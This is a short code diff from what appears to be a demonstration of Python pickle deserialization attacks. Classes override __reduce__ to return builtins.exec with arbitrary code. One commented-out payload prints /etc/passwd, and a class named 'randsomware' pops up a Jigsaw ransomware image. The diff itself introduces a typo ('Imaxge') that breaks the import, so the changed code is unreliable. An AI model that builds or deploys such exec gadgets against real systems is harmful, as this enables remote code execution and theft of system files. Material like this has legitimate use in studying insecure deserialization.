@@ -34,7 +34,7 @@ class pam(object):
 class randsomware(object):
     def __reduce__(self):
         # return (builtins.exec, ("with open('/etc/passwd','r') as r: print(r.readlines())",))
-        stri = 'from PIL import Image\nImage.open(' + "{}').show()".format("'./jigsaw-ransomware.gif")
+        stri = 'from PIL import Imaxge\nImage.open(' + "{}').show()".format("'./jigsaw-ransomware.gif")
         return (builtins.exec, (stri,))
 
 
